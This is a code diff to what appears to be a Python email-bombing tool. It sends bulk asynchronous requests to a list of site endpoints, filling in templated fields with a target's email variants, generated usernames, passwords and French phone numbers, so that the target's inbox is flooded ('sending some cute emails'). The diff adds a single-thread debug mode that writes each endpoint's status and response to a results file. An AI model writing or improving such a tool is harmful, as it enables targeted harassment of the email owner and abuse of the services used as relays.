@@ -59,20 +59,23 @@ def update_progress():
     if progress >= total:
         print("\r")
 
-async def fetch(session: aiohttp.ClientSession, sub: str, info):
+status_codes = []
+
+async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None):
     def fix(lol):
-        return json.loads(json.dumps(lol)
-            .replace("{email}", sub)
-            .replace("{password}", password)
-            .replace("{random}", rng)
-            .replace("{username}", generate_username())
-            .replace("{frenchnumber}", str(random.randint(100_000_000, 999_999_999)))
-            )
+        try:
+            required = isinstance(lol, (dict, tuple, list))
+            result = json.dumps(lol) if required else lol
+            result = result.replace("{email}", sub).replace("{password}", password).replace("{random}", generate_username()).replace("{username}", generate_username()).replace("{frenchnumber}", str(random.randint(100_000_000, 999_999_999)))
+            result = json.loads(result) if required else result
+        except Exception:
+            import traceback
+            print(traceback.format_exc())
+        return result
     try:
-        url = info.get("url")
+        url = fix(info.get("url"))
         method = info.get("method", "POST").upper()
         js = info.get("json")
-        rng = "".join(random.choices(string.ascii_lowercase, k=10))
         if js is not None:
             js = fix(js)
         data = info.get("data")
@@ -81,7 +84,7 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info):
         params = info.get("params")
         headers = info.get("headers")
         cookies = info.get("cookies")
-        await session.request(
+        async with session.request(
             method=method,
             url=url, 
             params=params,
@@ -89,7 +92,15 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info):
             data=data,
             headers=headers,
             cookies=cookies
-        )
+        ) as resp:
+            if threads > 1:
+                pass
+            else:
+                status = resp.status
+                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
+                resp = await resp.text()
+                resp = resp.replace("\n", "").strip()[:2000]
+                status_codes.append(f"{name or 'Unknown'}\n{method} {status} {evaluation}\nURL: {url}\nRESPONSE: {resp}")
     except Exception:
         pass
     update_progress()
@@ -119,7 +130,7 @@ async def main():
         ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
         ░                                                                                                                                                 
         """)
-        global progress, total, password
+        global progress, total, password, threads
         password = ""
         samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
         for _ in samples:
@@ -159,16 +170,20 @@ async def main():
             "THREADS": threads,
             "EMAIL": email,
             "PASSWORD": password,
+            "DEBUG MODE": threads == 1,
         }
         print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
         divide()
         print(f"😼 sending some cute emails :3")
         print("🔋 initializing...", end="\r")
         start = time.time()
-        tasks = [asyncio.create_task(fetch(session, sub, values)) for sub in variants for values in functions.values()]
+        tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
         for j in range(0, len(tasks), size):
             await asyncio.gather(*tasks[j:j+size])
             await asyncio.sleep(1)
+    if threads == 1:
+        with open("results.txt", "w", encoding="utf-8") as file:
+            file.write("\n\n".join(status_codes))
     print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
     print("😤 keep in mind that some emails can be delayed or never arrive")
     print("👋 have a nice day ^_^")
